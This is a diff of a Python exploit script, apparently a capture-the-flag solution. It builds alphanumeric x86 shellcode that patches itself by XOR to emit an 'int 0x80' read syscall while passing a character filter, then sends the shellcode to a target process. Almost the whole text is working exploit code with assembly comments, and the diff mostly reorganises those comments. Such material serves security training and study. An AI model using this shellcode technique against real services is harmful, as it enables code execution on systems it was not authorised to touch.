@@ -57,32 +57,33 @@ def conn():
 
 p = conn()
 
-filtered = {
-    "A": ["l", "r", "s", "g", "u", "t", "c", "m"],
-    "B": ["e", "", "r", "a", "i", "k", "h"],
-    "C": ["", "l", "a", "r", "o", "u", "d", "s", "m", "n", "f"],
-    "D": ["y", "b", "s"],
-    "E": ["u", "r", "s"],
-    "F": ["", "e", "r", "l", "m"],
-    "G": ["a", "e", "d"],
-    "H": ["", "e", "f", "g", "o", "s"],
-    "I": ["", "n", "r"],
-    "K": ["", "r"],
-    "L": ["i", "a", "u", "r", "v"],
-    "M": ["g", "n", "o", "t", "d"],
-    "N": ["", "e", "a", "i", "b", "d", "p", "o"],
-    "O": ["", "s"],
-    "P": ["", "d", "t", "r", "m", "b", "o", "a", "u"],
-    "R": ["b", "h", "u", "e", "n", "a", "f", "g"],
-    "S": ["i", "", "c", "e", "r", "n", "b", "m", "g"],
-    "T": ["i", "c", "b", "m", "a", "l", "h"],
-    "U": [""],
-    "V": [""],
-    "W": [""],
-    "X": ["e"],
-    "Y": ["", "b"],
-    "Z": ["n", "r"],
-}
+'''
+Elements
+"A": "l", "r", "s", "g", "u", "t", "c", "m",
+"B": "e", "", "r", "a", "i", "k", "h",
+"C": "", "l", "a", "r", "o", "u", "d", "s", "m", "n", "f",
+"D": "y", "b", "s",
+"E": "u", "r", "s",
+"F": "", "e", "r", "l", "m",
+"G": "a", "e", "d",
+"H": "", "e", "f", "g", "o", "s",
+"I": "", "n", "r",
+"K": "", "r",
+"L": "i", "a", "u", "r", "v",
+"M": "g", "n", "o", "t", "d",
+"N": "", "e", "a", "i", "b", "d", "p", "o",
+"O": "", "s",
+"P": "", "d", "t", "r", "m", "b", "o", "a", "u",
+"R": "b", "h", "u", "e", "n", "a", "f", "g",
+"S": "i", "", "c", "e", "r", "n", "b", "m", "g",
+"T": "i", "c", "b", "m", "a", "l", "h",
+"U": "",
+"V": "",
+"W": "",
+"X": "e",
+"Y": "", "b",
+"Z": "n", "r",
+'''
 
 '''
 | Char | Hex       | Instruction                  
@@ -127,15 +128,16 @@ filtered = {
 | k    | 0x6B      | imul reg, r/m, imm8          
 '''
 
-shellcode = b""
 # sub ecx, 11 -> cl = 0xf5
-shellcode += b"I" * 11
+shellcode = b"I" * 11
 # xor dword ptr [eax + 0x65], ecx
-shellcode += b"1He" # 0x38 ^ 0xf5 = 0xcd
+# 0x38 ^ 0xf5 = 0xcd
+shellcode += b"1He"
 # push 0x46464646; pop ecx -> cl = 0x46
 shellcode += b"BhFFFFY"
 # xor dword ptr [eax + 0x66], ecx
-shellcode += b'1Hf' # 0x39 ^ 0x46 ^ 0xff = 0x80
+# 0x39 ^ 0x46 ^ 0xff = 0x80
+shellcode += b'1Hf'
 # eax = 0x324f6e4d
 # push eax (x3)
 shellcode += b'PPP'
@@ -157,13 +159,13 @@ EAX -> 0x324f6e4d
 '''
 # push 0x33333334
 shellcode += b"Bh4333"
-# pop eax; xor eax, 0x33333337 -> eax = 3
+# pop eax; xor eax, 0x33333337 -> eax = 3 (read)
 shellcode += b'Xe57333'
 # just padding
 shellcode = shellcode.ljust(101, b'F')
 # [eax + 0x65] = 0x38
 # [eax + 0x66] = 0x39
-# -> int 0x80
+# 0x80cd -> int 0x80
 shellcode += b'89'
 
 sl(p, shellcode)
